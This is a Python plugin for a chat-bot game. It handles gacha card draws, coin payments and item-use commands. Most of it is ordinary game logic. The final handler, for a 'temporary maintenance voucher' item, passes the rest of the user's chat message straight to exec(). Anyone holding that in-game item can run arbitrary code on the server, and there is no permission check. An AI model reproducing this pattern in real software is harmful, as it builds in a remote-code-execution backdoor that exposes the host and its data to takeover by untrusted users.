import re
from collections import Counter
from collections.abc import Callable, Coroutine
from clovers_utils.tools import to_int
from clovers_leafgame.core.clovers import Event, to_me
from clovers_leafgame.main import plugin, manager
from clovers_leafgame.item import Prop, GOLD
from clovers_leafgame.output import prop_card
from .output import report_card
from .library import gacha, AIR_PACK, RED_PACK

from clovers_core.config import config as clovers_config

gacha_gold = clovers_config.get(__package__, {}).get("gacha_gold", 50)


@plugin.handle(r"^.+连抽?卡?|单抽", {"user_id", "group_id", "nickname", "to_me"})
@to_me.decorator
async def _(event: Event):
    N = re.search(r"^(.*)连抽?卡?$", event.raw_event.raw_command)
    if not N:
        return
    N = to_int(N.group(1))
    if not N:
        return
    N = 200 if N > 200 else 1 if N < 1 else N
    gold = N * gacha_gold
    user, account = manager.account(event)
    if n := GOLD.deal(account.bank, -gold):
        return f"{N}连抽卡需要{gold}金币，你的金币：{n}。"

    prop_data: list[list[tuple[Prop, int]]] = [[], [], []]
    report_data = {"prop_star": 0, "prop_n": 0, "air_star": 0, "air_n": 0}
    for prop_id, n in Counter(gacha() for _ in range(N)).items():
        prop = manager.props_library[prop_id]
        prop_data[prop.domain].append((prop, n))
        if prop.domain == 0:
            star_key = "air_star"
            n_key = "air_n"
        else:
            star_key = "prop_star"
            n_key = "prop_n"
            prop.deal(prop.locate_bank(user, account), n)
        report_data[star_key] += prop.rare * n
        report_data[n_key] += n
    if N < 10:
        return "你获得了" + "\n".join(f"({prop.rare}☆){prop.name}:{n}个" for seg in prop_data for prop, n in seg)
    else:
        info = [report_card(account.name, **report_data)]
        if report_data["prop_n"] == 0:
            AIR_PACK.deal(user.bank, 1)
            RED_PACK.deal(account.bank, 10)
            GOLD.deal(account.bank, gold)
            info.append(prop_card([(AIR_PACK, 1), (GOLD, gold), (RED_PACK, 10)], f"本次抽卡已免费"))
        if data := prop_data[2]:
            info.append(prop_card(data, "全局道具"))
        if data := prop_data[1]:
            info.append(prop_card(data, "群内道具"))
        if data := prop_data[0]:
            info.append(prop_card(data, "未获取"))

    return manager.info_card(info, user.id)


from clovers_core.plugin import PluginError


def usage(prop_name: str, extra_args: list[str] | set[str] | tuple[str] = None):
    def decorator(func: Callable[..., Coroutine]):
        prop = manager.props_library.get(prop_name)
        if not prop:
            raise PluginError(f"不存在道具{prop_name}，无法注册使用方法。")

        @plugin.handle(f"使用(道具)?\\s*{prop_name}", extra_args)
        async def _(event: Event):
            res = re.search(f"使用(道具)?\\s*{prop_name}\\s*(\\d*)(.*)", event.raw_event.raw_command)
            count = res.group(2)
            return await func(prop, event, int(count) if count else 1, res.group(3))

    return decorator


@usage("金币", {"user_id", "group_id", "nickname"})
async def _(prop: Prop, event: Event, count: int, extra: str):
    user, account = manager.account(event)
    if n := prop.deal(prop.locate_bank(user, account), -count):
        return f"使用失败，你还有{n}枚金币。"
    return f"你使用了{count}枚金币。"


@usage("临时维护凭证", {"user_id", "group_id", "nickname"})
async def _(prop: Prop, event: Event, count: int, extra: str):
    user, account = manager.account(event)
    bank = prop.locate_bank(user, account)
    if prop.deal(bank, -1):
        return f"使用失败，你未持有临时维护凭证"
    try:
        exec(extra.strip())
        return f"执行成功！"
    except Exception as e:
        prop.deal(bank, 1)
        return str(e)
